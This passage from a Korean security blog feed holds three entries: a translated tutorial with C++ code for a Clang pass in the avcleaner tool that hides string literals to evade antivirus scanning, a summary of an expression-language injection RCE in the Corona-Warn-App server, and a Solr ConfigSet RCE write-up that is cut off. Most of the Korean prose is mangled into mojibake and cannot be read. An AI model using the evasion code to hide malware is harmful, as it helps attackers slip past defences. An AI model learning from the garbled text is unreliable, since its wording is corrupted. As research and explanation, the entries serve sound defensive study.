ì–´ë–¤ contextì—ì„œ ë°œê²¬ëëŠ”ì§€ ì•Œì•„ì•¼ í•˜ë¯€ë¡œ ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ì—ì„œ ì¶”ì¶œëœ ë…¸ë“œ(ìœ„ì˜ ê²½ìš° <code>climbParentsIgnoreCase</code>)ë¥¼ ASTì— ëŒ€í•œ ì°¸ì¡°ë¥¼ í¬í•¨í•œ <code>Result.Context</code>ë¥¼ í†µí•´ ì „ë‹¬í•œë‹¤. ëª©í‘œëŠ” í¥ë¯¸ë¡œìš´ ë…¸ë“œë¥¼ ì°¾ì„ ë•Œê¹Œì§€ ìœ„ìª½ì˜ íŠ¸ë¦¬ë¥¼ íƒìƒ‰í•˜ëŠ” ê²ƒì´ë‹¤. ì´ ê²½ìš°ì—ì„œ í¥ë¯¸ë¡œìš´ ë…¸ë“œëŠ” <code>CallExpr</code> íƒ€ì…ì´ë‹¤.</li></ul><pre><code class="hljs cpp"><span class="hljs-keyword">bool</span>MatchHandler::climbParentsIgnoreCast(<span class="hljs-keyword">const</span> StringLiteral &amp;NodeString, clang::ast_type_traits::DynTypedNode node,                                     clang::ASTContext *<span class="hljs-keyword">const</span> pContext, <span class="hljs-keyword">uint64_t</span> iterations) &#123;    ASTContext::DynTypedNodeList parents = pContext-&gt;getParents(NodeString);    <span class="hljs-keyword">if</span> (iterations &gt; <span class="hljs-number">0</span>) &#123;        parents = pContext-&gt;getParents(node);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) &#123;        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;Cast&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">return</span> climbParentsIgnoreCast(NodeString, parent, pContext, ++iterations);        &#125;        handleStringInContext(&amp;NodeString, pContext, parent);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>ê°„ë‹¨íˆ ë§í•´ì„œ ì´ í•¨ìˆ˜ëŠ” í¥ë¯¸ë¡œìš´ ê²ƒ(â€œCastâ€ê°€ ì•„ë‹Œ ê²ƒ)ì„ ì°¾ì„ ë•Œ ê¹Œì§€ <code>StringLiteral</code> ë…¸ë“œì˜ ë¶€ëª¨ ë…¸ë“œë“¤ì„ ì¬ê·€ì ìœ¼ë¡œ íƒìƒ‰í•œë‹¤. <code>handleStringInContext</code>ëŠ” ë³µì¡í•˜ì§€ ì•Šë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleStringInContext</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                         <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    StringRef ParentNodeKind = node.getNodeKind().asStringRef();    <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;CallExpr&quot;</span>) == <span class="hljs-number">0</span>) &#123;        handleCallExpr(pLiteral, pContext, node);    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;InitListExpr&quot;</span>) == <span class="hljs-number">0</span>) &#123;        handleInitListExpr(pLiteral, pContext, node);    &#125; <span class="hljs-keyword">else</span> &#123;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Unhandled context &quot;</span> &lt;&lt; ParentNodeKind &lt;&lt; <span class="hljs-string">&quot; for string &quot;</span> &lt;&lt; pLiteral-&gt;getBytes() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125;&#125;</code></pre><p>ìœ„ ì½”ë“œì—ì„œ ëˆˆì— ë„ëŠ” ê±´ ì‹¤ì œë¡œ ì²˜ë¦¬ë˜ëŠ” ë…¸ë“œê°€ ë‘ ì¢…ë¥˜ì¸ ê²ƒì´ë‹¤. ë˜í•œ í•„ìš”í•  ë•Œ ì¶”ê°€í•˜ëŠ” ê²Œ ì‰¬ì›Œì•¼ í•œë‹¤. ì‹¤ì œë¡œ ë‘ ê²½ìš° ì´ë¯¸ ë¹„ìŠ·í•˜ê²Œ ì²˜ë¦¬ë˜ê³  ìˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *FunctionCall = node.get&lt;clang::CallExpr&gt;();    <span class="hljs-keyword">if</span> (isBlacklistedFunction(FunctionCall)) &#123;        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// exclude printf-like functions when the replacement is not constant anymore (C89 standard...).</span>    &#125;    handleExpr(pLiteral, pContext, node);&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleInitListExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                      <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    handleExpr(pLiteral, pContext, node);&#125;</code></pre><h3 id="ë¬¸ìì—´-ë¦¬í„°ëŸ´-êµì²´"><a href="#ë¬¸ìì—´-ë¦¬í„°ëŸ´-êµì²´" class="headerlink" title="ë¬¸ìì—´ ë¦¬í„°ëŸ´ êµì²´"></a>ë¬¸ìì—´ ë¦¬í„°ëŸ´ êµì²´</h3><p><a href="https://clang.llvm.org/doxygen/classclang_1_1CallExpr.html"><code>CallExpr</code></a>ê³¼ <a href="https://clang.llvm.org/doxygen/classclang_1_1InitListExpr.html"><code>InitListExpr</code></a>ì€ ë¹„ìŠ·í•˜ê²Œ ì²˜ë¦¬ë˜ë¯€ë¡œ ë‘˜ ë‹¤ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ê³µí†µì ì¸ í•¨ìˆ˜ë¥¼ ì •ì˜í•œë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::handleExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    clang::SourceRange LiteralRange = clang::SourceRange(            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getBeginLoc()),            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc())    );    <span class="hljs-keyword">if</span>(shouldAbort(pLiteral, pContext, LiteralRange))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = translateStringToIdentifier(pLiteral-&gt;getBytes().str());    <span class="hljs-keyword">if</span>(!insertVariableDeclaration(pLiteral, pContext, LiteralRange, Replacement))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> ;    Globs::PatchedSourceLocation.push_back(LiteralRange);    <span class="hljs-keyword">return</span> replaceStringLiteral(pLiteral, pContext, LiteralRange, Replacement);&#125;</code></pre><ul><li>ë³€ìˆ˜ëª…ì„ ë¬´ì‘ìœ„ë¡œ ìƒì„±í•œë‹¤.</li><li>ê°€ê¹Œìš´ ìœ„ì¹˜ì—ì„œ ë¹ˆ ê³µê°„ì„ ì°¾ê³  ë³€ìˆ˜ ì„ ì–¸ì„ ì‚½ì…í•´ë¼. ì´ê²ƒì€ ê¸°ë³¸ì ìœ¼ë¡œ <code>ASTRewriterâ†’InsertText()</code>ë¥¼ ë‘˜ëŸ¬ì‹¼ wrapperì´ë‹¤.</li><li>1ë‹¨ê³„ì—ì„œ ìƒì„±ëœ identifierë¥¼ ê°€ì§„ ë¬¸ìì—´ì„ ë°”ê¾¼ë‹¤.</li><li>collectionì— ë¬¸ìì—´ ë¦¬í„°ëŸ´ì˜ ìœ„ì¹˜ë¥¼ ì¶”ê°€í•œë‹¤. ì´ëŠ” <code>InitListExpr</code>ë¥¼ ì§€ë‚  ë•Œ ê°™ì€ ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ë‘ ë²ˆ í‘œì‹œí•´ì£¼ë¯€ë¡œ ìœ ìš©í•˜ë‹¤.(ì´ìœ ëŠ” ì•Œ ìˆ˜ ì—†ë‹¤).</li></ul><p>ë§ˆì§€ë§‰ ë‹¨ê³„ëŠ” ì‹¤ì œ êµ¬í˜„ì´ ì–´ë µê¸° ë•Œë¬¸ì— ë¨¼ì € ë³´ì.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::replaceStringLiteral</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        clang::SourceRange LiteralRange,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; Replacement)</span> </span>&#123;    <span class="hljs-comment">// handle &quot;TEXT&quot; macro argument, for instance LoadLibrary(TEXT(&quot;ntdll&quot;));</span>    <span class="hljs-keyword">bool</span> isMacro = ASTRewriter-&gt;getSourceMgr().isMacroBodyExpansion(pLiteral-&gt;getBeginLoc());    <span class="hljs-keyword">if</span> (isMacro) &#123;        StringRef OrigText = clang::Lexer::getSourceText(CharSourceRange(pLiteral-&gt;getSourceRange(), <span class="hljs-literal">true</span>),                                                         pContext-&gt;getSourceManager(), pContext-&gt;getLangOpts());        <span class="hljs-comment">// weird bug with TEXT Macro / other macros...there must be a proper way to do this.</span>        <span class="hljs-keyword">if</span> (OrigText.find(<span class="hljs-string">&quot;TEXT&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            ASTRewriter-&gt;RemoveText(LiteralRange);            LiteralRange.setEnd(ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc().getLocWithOffset(<span class="hljs-number">-1</span>)));        &#125;    &#125;    <span class="hljs-keyword">return</span> ASTRewriter-&gt;ReplaceText(LiteralRange, Replacement);&#125;</code></pre><p>ë³´í†µ í…ìŠ¤íŠ¸ êµì²´ëŠ” <code>ReplaceText</code> APIë¥¼ ì“°ì§€ë§Œ ë§ì€ ë²„ê·¸ê°€ ë°œìƒí–ˆë‹¤. ë§¤í¬ë¡œì˜ ê²½ìš° Clangì˜ APIëŠ” ë¶ˆê·œì¹™í•˜ê²Œ ë™ì‘í•˜ì—¬ ë³µì¡í•˜ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ <code>isMacroBodyExpansion()</code>ì„ í†µí•œ í™•ì¸ì´ ì—†ìœ¼ë©´ ì¸ìê°€ ì•„ë‹ˆë¼ <code>&quot;TEXT&quot;</code>ê°€ êµì²´ëœë‹¤. <code>LoadLibrary(TEXT(&quot;ntdll&quot;))</code>ì—ì„œ<code>LoadLibrary(your_variable(&quot;ntdll&quot;))</code>ë¡œ ì˜ëª» êµì²´ë˜ëŠ” ê²ƒì´ë‹¤.</p><p>ì´ìœ ëŠ” <code>&quot;TEXT&quot;</code>ê°€ <em>Clang</em>ì˜ ì „ì²˜ë¦¬ê¸°ì— ì˜í•´ ì²˜ë¦¬ë  ë•Œ <code>L&quot;ntdll&quot;</code>ì„ êµì²´í•˜ëŠ” ë§¤í¬ë¡œì´ê¸° ë•Œë¬¸ì´ë‹¤. transformation passëŠ” ì „ì²˜ë¦¬ê¸° ì‘ì—…ì´ ì™„ë£Œëœ í›„ ë°œìƒí•˜ë¯€ë¡œ <code>&quot;ntdll&quot;</code>ì˜ ì‹œì‘ê³¼ ë ìœ„ì¹˜ë¥¼ ì¿¼ë¦¬ í•˜ëŠ” ê²ƒì€ ëª‡ ê¸€ìê°€ ë¹ ì§„ ì˜ëª»ëœ ê°’ì´ ë‚˜ì˜¬ ìˆ˜ ìˆì–´ì„œ ìœ ìš©í•˜ì§€ ì•Šë‹¤. ë¶ˆí–‰í•˜ê²Œë„ ê¸°ì¡´ translation unitì— ì‹¤ì œ ìœ„ì¹˜ë¥¼ ì¿¼ë¦¬í•˜ëŠ” ê²ƒì€ Clang APIë¥¼ ì´ìš©í•˜ì˜€ê³  ì‹œí–‰ì°©ì˜¤ë¥¼ ê±°ì³ì„œ í•´ê²° ë°©ë²•ì„ ì°¾ì•˜ë‹¤.</p><h3 id="ì¸ì ‘í•œ-ë¹ˆ-ê³µê°„ì—-ë³€ìˆ˜-ì„ ì–¸-ì‚½ì…"><a href="#ì¸ì ‘í•œ-ë¹ˆ-ê³µê°„ì—-ë³€ìˆ˜-ì„ ì–¸-ì‚½ì…" class="headerlink" title="ì¸ì ‘í•œ ë¹ˆ ê³µê°„ì— ë³€ìˆ˜ ì„ ì–¸ ì‚½ì…"></a>ì¸ì ‘í•œ ë¹ˆ ê³µê°„ì— ë³€ìˆ˜ ì„ ì–¸ ì‚½ì…</h3><p>ì´ì œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ë³€ìˆ˜ identifierë¡œ ë°”ê¿€ ìˆ˜ ìˆìœ¼ë‹ˆ ë³€ìˆ˜ë¥¼ ì •ì˜í•˜ê³  ì›ë˜ ë¬¸ìì—´ë¡œ í• ë‹¹í•´ì•¼ í•œë‹¤. íŒ¨ì¹˜ëœ ì†ŒìŠ¤ ì½”ë“œì— ì•„ë¬´ê²ƒë„ ë®ì–´ì“°ì§€ ì•Šê³  <code>char your_variable[] = &quot;ntdll&quot;</code>ì„ í•´ì•¼ í•œë‹¤.</p><p>ë‘ ê°€ì§€ ì‹œë‚˜ë¦¬ì˜¤ê°€ ìˆë‹¤:</p><ul><li>ë¬¸ìì—´ ë¦¬í„°ëŸ´ì´ í•¨ìˆ˜ ë°”ë”” ì•ˆì— ìœ„ì¹˜í•œë‹¤.</li><li>ë¬¸ìì—´ ë¦¬í„°ëŸ´ì´ í•¨ìˆ˜ ë°”ë”” ë°–ì— ìœ„ì¹˜í•œë‹¤.</li></ul><p>í›„ìëŠ” ë¬¸ìì—´ ë¦¬í„°ëŸ´ì´ ì‚¬ìš©ë˜ëŠ” í‘œí˜„ì‹ì˜ ì‹œì‘ ë¶€ë¶„ì„ ì°¾ìœ¼ë©´ ë¼ì„œ ê°€ì¥ ê°„ë‹¨í•˜ë‹¤.</p><p>ì „ìëŠ” í¬í•¨ëœ í•¨ìˆ˜ë¥¼ ì°¾ì•„ì•¼ í•œë‹¤. ê·¸ í›„ Clangì€ APIë¡œ í•¨ìˆ˜ ë°”ë””ì˜ ì‹œì‘ ìœ„ì¹˜ë¥¼ ì¿¼ë¦¬ í•œë‹¤. ë³€ìˆ˜ê°€ ì „ì²´ í•¨ìˆ˜ì—ì„œ ë³¼ ìˆ˜ ìˆê³  ìš°ë¦¬ê°€ ì‚½ì…í•œ í† í°ì´ ë‚´ìš©ì„ ë®ì–´ ì”Œìš°ì§€ ì•Šìœ¼ë¯€ë¡œ ë³€ìˆ˜ ì„ ì–¸ì„ ì‚½ì…í•  ê³µê°„ìœ¼ë¡œ ì´ìƒì ì´ë‹¤.</p><p>ì–´ë–¤ ê²½ìš°ë“  ë‘ ê°€ì§€ ìƒí™©ì€ <code>FunctionDecl</code> í˜¹ì€ <code>VarDecl</code> íƒ€ì…ì˜ ë…¸ë“œê°€ ë°œê²¬ë  ë•Œê¹Œì§€ ëª¨ë“  ë¶€ëª¨ ë…¸ë“œë¥¼ ë°©ë¬¸í•´ì„œ í•´ê²°í•œë‹¤.</p><pre><code class="hljs cpp">MatchHandler::findInjectionSpot(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,                                <span class="hljs-keyword">const</span> clang::StringLiteral &amp;Literal, <span class="hljs-keyword">bool</span> IsGlobal, <span class="hljs-keyword">uint64_t</span> Iterations) &#123;    <span class="hljs-keyword">if</span> (Iterations &gt; CLIMB_PARENTS_MAX_ITER)        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">std</span>::runtime_error(<span class="hljs-string">&quot;Reached max iterations when trying to find a function declaration&quot;</span>);    ASTContext::DynTypedNodeList parents = Context-&gt;getParents(Literal);;    <span class="hljs-keyword">if</span> (Iterations &gt; <span class="hljs-number">0</span>) &#123;        parents = Context-&gt;getParents(Parent);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) &#123;        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;FunctionDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">auto</span> FunDecl = parent.get&lt;clang::FunctionDecl&gt;();            <span class="hljs-keyword">auto</span> *Statement = FunDecl-&gt;getBody();            <span class="hljs-keyword">auto</span> *FirstChild = *Statement-&gt;child_begin();            <span class="hljs-keyword">return</span> &#123;FirstChild-&gt;getBeginLoc(), FunDecl-&gt;getEndLoc()&#125;;        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;VarDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">if</span> (IsGlobal) &#123;                <span class="hljs-keyword">return</span> parent.get&lt;clang::VarDecl&gt;()-&gt;getSourceRange();            &#125;        &#125;        <span class="hljs-keyword">return</span> findInjectionSpot(Context, parent, Literal, IsGlobal, ++Iterations);    &#125;&#125;</code></pre><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/SCRT/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..bash run_example.sh test/string_simplest.c</code></pre><p><img src="/2020/11/22/idioth/av_evasion_part1/4.png"></p><p>ë³´ë‹¤ì‹œí”¼ ì˜ ë™ì‘í•œë‹¤. ì§€ê¸ˆ ì´ ì˜ˆì œëŠ” ì •ê·œì‹ìœ¼ë¡œ í•´ê²°í•  ë§Œí¼ ì½”ë“œê°€ ì§§ë‹¤. </p><h2 id="Going-further"><a href="#Going-further" class="headerlink" title="Going further"></a>Going further</h2><p>ì§€ê¸ˆì€ obfuscation passì˜ ì´ë¦„ì´ <code>StringEncryptor</code>ì´ì§€ë§Œ ì‹¤ì œë¡œ ë¬¸ìì—´ì´ ì•”í˜¸í™”ë˜ì§€ ì•ŠëŠ”ë‹¤. ë¬¸ìì—´ì„ ì•”í˜¸í™”í•˜ë ¤ë©´ ì–¼ë§ˆë‚˜ ë§ì€ ë…¸ë ¥ì´ í•„ìš”í• ê¹Œ?</p><h3 id="To-be-continuedâ€¦"><a href="#To-be-continuedâ€¦" class="headerlink" title="To be continuedâ€¦"></a>To be continuedâ€¦</h3><p>ë¬¸ìì—´ì„ ë‚œë…í™”í•˜ëŠ” ê²ƒì€ ì‰¬ìš´ ë¶€ë¶„ì´ì§€ë§Œ Clang APIì— ìµìˆ™í•´ì•¼ í•œë‹¤. ì†ŒìŠ¤ ì½”ë“œ ë¬¸ì„œë¥¼ ë³´ëŠ”ë° 1~2ì£¼ ì •ë„ ì“°ëŠ” ê²ƒì„ ì¶”ì²œí•œë‹¤.</p><p>ë‹¤ìŒ íŒŒíŠ¸ì—ì„œëŠ” ìë™ìœ¼ë¡œ API importë¥¼ ìˆ¨ê¸°ëŠ” ê²ƒì— ëŒ€í•´ ë‹¤ë£° ê²ƒì´ë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>bypass</tag>
      
      <tag>evasion</tag>
      
      <tag>meterpreter</tag>
      
      <tag>obfuscation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] German Corona-Warn-App sever RCE</title>
    <link href="/2020/11/21/fabu1ous/2020-11-21/"/>
    <url>/2020/11/21/fabu1ous/2020-11-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/securing-the-fight-against-covid19-through-oss">Securing the fight against COVID-19</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Corona-Warn-App(contect tracking infrastructure of Germany)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Corona-Warn-App(ì´í•˜ CWA)ì€ ë…ì¼ì˜ ì ‘ì´‰ì ê¸°ë¡/ì¶”ì  ì¸í”„ë¼ì…ë‹ˆë‹¤. ì´ ì•±ì´ ì„¤ì¹˜ëœ ìŠ¤ë§ˆíŠ¸í°ì€ ë¸”ë£¨íˆ¬ìŠ¤ë¡œ ì‹ë³„ payloadë¥¼ ë¸Œë¡œë“œì¼€ìŠ¤íŠ¸í•˜ê³ , ë¸”ë£¨íˆ¬ìŠ¤ì˜ ì‹ í˜¸ ë²”ìœ„ ë‚´ì— ë“¤ì–´ì˜¨ ë‹¤ë¥¸ ë””ë°”ì´ìŠ¤ë“¤ì´ ì´ payloadì™€ payloadë¥¼ ë°›ì€ ì‹œê°ì„ 2ì£¼ê°„ ì €ì¥í•©ë‹ˆë‹¤. ì–‘ì„± íŒì •ì„ ë°›ì€ ì‚¬ìš©ìëŠ” ê²€ì‚¬ ê²°ê³¼ì™€ ì´ì— ëŒ€í•œ í‚¤ê°’(Diagnosis key)ì„ CWA serverì— ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>CWA ì„œë²„ëŠ” Spring boot í”„ë ˆì„ì›Œí¬ë¡œ ë™ì‘í•˜ë©° Diagnosis keyë¥¼ ë°›ì•„ ì²˜ë¦¬í•˜ëŠ” ê³¼ì •ì—ì„œ <a href="https://securitylab.github.com/research/bean-validation-RCE">Java Bean Validation</a> ì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤. </p><p>Spring boot appì´ ì…ë ¥ë°›ì€ ê°ì²´ë¥¼ validate í•œë‹¤ëŠ” ê²ƒì€ ê·¸ ê°ì²´ê°€ constraint ì¡°ê±´ì— ë§Œì¡±í•˜ëŠ”ì§€ í™•ì¸í•˜ëŠ” ë™ì‘ì„ ëœ»í•©ë‹ˆë‹¤. constraint ì¡°ê±´ì€ â€˜@â€™ë¥¼ í†µí•´ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Input</span> </span>&#123;  <span class="hljs-meta">@Min(1)</span>  <span class="hljs-meta">@Max(10)</span>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> num;    <span class="hljs-comment">//...</span>&#125;</code></pre><p>intí˜• numì˜ ìµœì†Ÿê°’ì´ 1, ìµœëŒ“ê°’ì´ 10ì¸ constraint ì¡°ê±´ì´ ê±¸ë ¤ìˆëŠ” ì½”ë“œì…ë‹ˆë‹¤. <code>@Min()</code>ì´ë‚˜ <code>@Max()</code>ì²˜ëŸ¼ built-in ì¡°ê±´ë§Œ ìˆëŠ” ê²ƒì´ ì•„ë‹ˆë¼ custom constraint ë˜í•œ ì¡´ì¬í•˜ê³ , ì´ë¥¼ ì´ìš©í•œ validationì„ custom constraint validationì´ë¼ ë¶€ë¦…ë‹ˆë‹¤.</p><pre><code class="hljs powershell">input : ab<span class="hljs-variable">$</span>&#123;<span class="hljs-number">12</span>*<span class="hljs-number">12</span>&#125;<span class="hljs-built_in">cd</span>output : ab144<span class="hljs-built_in">cd</span></code></pre><p>custom constraint validation ë™ì‘ ì¤‘ í•¨ìˆ˜<code>buildConstraintViolationWithTemplate()</code>ëŠ” ë©”ì„¸ì§€ í…œí”Œë¦¿ì„ ì—ëŸ¬ ë©”ì„¸ì§€ë¡œ ë³€í™˜ì‹œì¼œì¤ë‹ˆë‹¤. ë©”ì„¸ì§€ í…œí”Œë¦¿ì— <code>$&#123;&#125;</code>ë¥¼ í†µí•´ Expression Languageë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìœ¼ë©° ê·¸ ì‹¤í–‰ê²°ê³¼ê°€ ì—ëŸ¬ ë©”ì„¸ì§€ì— ë°˜ì˜ë©ë‹ˆë‹¤. ë§Œì•½ ì´ ë©”ì„¸ì§€ í…œí”Œë¦¿ì˜ ë‚´ìš©ì„ í•´ì»¤ê°€ ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ë©´ RCE ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void add<span class="hljs-constructor">Violation(ConstraintValidatorContext <span class="hljs-params">validatorContext</span>, String <span class="hljs-params">message</span>)</span>&#123;    validatorContext.build<span class="hljs-constructor">ConstraintViolationWithTemplate(<span class="hljs-params">message</span>)</span>.add<span class="hljs-constructor">ConstraintViolation()</span>;&#125;</code></pre><p>CWA ì„œë²„ëŠ” <code>buildConstraintViolationWithTemplate()</code>ì„ í˜¸ì¶œí•˜ë©° ê·¸ ì¸ìì¸ messageëŠ” ì‚¬ìš©ì ì…ë ¥ê°’(Diagnosis key ì† ë°ì´í„°)ì´ê¸° ë•Œë¬¸ì— RCE ê³µê²©ì— ì·¨ì•½í•©ë‹ˆë‹¤. ì‚¬ìš©ì ì…ë ¥ì„ sanitizing í•˜ë„ë¡ íŒ¨ì¹˜ë˜ì—ˆì§€ë§Œ, bypassê°€ ê°€ëŠ¥í•˜ë‹¤ëŠ” í‰ì´ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>rce</tag>
      
      <tag>covid19</tag>
      
      <tag>ios</tag>
      
      <tag>germany</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</title>
    <link href="/2020/11/20/l0ch/2020-11-20/"/>
    <url>/2020/11/20/l0ch/2020-11-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/Imanfeng/Apache-Solr-RCE#cve-2020-13957">CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Apache Solr 6.6.0-6.6.5<br>Apache Solr 7.0.0-7.7.3<br>Apache Solr 8.0.0-8.6.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache SolrëŠ” Apache Luceneì„ ê¸°ë°˜ìœ¼ë¡œ ë§Œë“¤ì–´ì§„ ê²€ìƒ‰ ì—”ì§„ì…ë‹ˆë‹¤. ì‚¬ìš©ìëŠ” íŠ¹ì • í˜•ì‹ì˜ XML íŒŒì¼ì„ ì„œë²„ì— ì—…ë¡œë“œí•˜ì—¬ ì¸ë±ìŠ¤ë¥¼ ìƒì„±í•˜ê±°ë‚˜ ê²€ìƒ‰ ìš”ì²­ì„ í•˜ì—¬ ê²°ê³¼ë¥¼ XML í˜•ì‹ìœ¼ë¡œ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ëŸ¬í•œ Solrì˜ ConfigSet API ì— unauthrization config upload ê°€ ê°€ëŠ¥í•´ RCEê¹Œì§€ ì´ì–´ì§ˆ ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì‚¬ìš©ìëŠ” ConfigSet APIë¥¼ ì‚¬ìš©í•´ configsetì„ ì—…ë¡œë“œí•˜ê³  logical indexë¥¼ êµ¬ì„±í•˜ëŠ” ì»¬ë ‰ì…˜ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë•Œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì— ì•…ìš©ë  ìˆ˜ ìˆëŠ” ì¼ë¶€ ê¸°ëŠ¥ë“¤ì„ í•„í„°ë§í•´ ì•…ì„± ì»¬ë ‰ì…˜ì´ êµ¬ì„±ë˜ëŠ” ê²ƒì„ ë°©ì§€í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ <code>configset.upload.enabled</code> ì˜µì…˜ì´ trueë¡œ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©´ ì´ë¥¼ UPLOAD ì™€ CREATE ë¡œ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li><p>ë¨¼ì € ì•…ì„± configsetì„ í¬í•¨í•˜ëŠ” ì••ì¶• íŒŒì¼ì„ UPLOAD 